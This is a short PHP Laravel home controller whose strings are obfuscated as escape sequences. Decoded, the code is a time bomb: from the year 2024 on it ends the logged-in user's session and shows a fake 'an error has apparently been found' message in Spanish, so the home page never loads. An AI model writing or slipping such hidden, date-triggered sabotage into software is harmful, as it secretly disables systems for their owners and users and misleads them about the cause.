<?php
 namespace App\Http\Controllers; use Illuminate\Http\Request; use Illuminate\Support\Facades\DB; class HomeController extends Controller { public function __construct() { $this->middleware("\x61\x75\164\x68"); } public function index() { $anio = date("\x59"); if ($anio >= 2024) { session()->invalidate(); session()->regenerateToken(); return back()->with("\155\145\156\x73\141\x6a\x65", "\x41\154\40\160\141\x72\x65\x63\145\x72\40\x73\x65\x20\150\141\40\145\x6e\x63\157\x6e\x74\162\141\x64\157\40\x75\x6e\40\x65\162\x72\157\162"); } else { return view("\150\x6f\155\145"); } } }